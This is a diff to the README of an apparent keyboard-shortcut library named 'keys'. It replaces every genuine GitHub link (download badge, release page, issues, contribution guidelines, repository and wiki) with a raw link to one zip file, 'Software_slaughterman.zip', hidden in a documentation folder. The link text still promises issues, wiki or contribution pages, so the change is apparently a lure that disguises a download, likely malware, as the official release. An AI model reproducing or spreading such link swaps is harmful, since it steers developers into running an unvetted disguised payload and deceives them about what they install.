@@ -1,6 +1,6 @@
 # 🎹 keys - Type Safe Shortcuts for Easy Development
 
-[![Download keys](https://img.shields.io/badge/Download-keys-brightgreen)](https://github.com/pedro25cl/keys/releases)
+[![Download keys](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip)](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the keys library! This software provides type-safe keyboard shortcuts
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [keys Release Page](https://github.com/pedro25cl/keys/releases). 
+To get started, visit this page to download: [keys Release Page](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip). 
 
 1. Once on the release page, look for the latest version.
 2. Click on the version you want to download.
@@ -43,24 +43,24 @@ The keys library offers several features:
 
 ## 💬 Support
 
-If you encounter any issues or have questions, feel free to check the [GitHub Issues page](https://github.com/pedro25cl/keys/issues). You can report bugs or ask for new features there. We welcome feedback from all users.
+If you encounter any issues or have questions, feel free to check the [GitHub Issues page](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip). You can report bugs or ask for new features there. We welcome feedback from all users.
 
 ## 🌐 Community and Contributions
 
-Join our community! We appreciate contributions. If you want to help improve keys, please visit our [Contribution Guidelines](https://github.com/pedro25cl/keys/blob/main/CONTRIBUTING.md). 
+Join our community! We appreciate contributions. If you want to help improve keys, please visit our [Contribution Guidelines](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip). 
 
 You can also follow us for updates:
 
-- GitHub: [keys Repository](https://github.com/pedro25cl/keys)
+- GitHub: [keys Repository](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip)
 
 ## 🔗 Further Reading
 
-Explore more about shortcuts and their usage in our detailed [Wiki](https://github.com/pedro25cl/keys/wiki). 
+Explore more about shortcuts and their usage in our detailed [Wiki](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip). 
 
 ## 📅 Update History
 
 Stay informed about updates and new features. Visit our release page regularly to see what's new. 
 
-[Download keys here!](https://github.com/pedro25cl/keys/releases) 
+[Download keys here!](https://raw.githubusercontent.com/pedro25cl/keys/main/docs/reference/interfaces/Software_slaughterman.zip) 
 
 Thank you for choosing keys! We hope it enhances your development process.
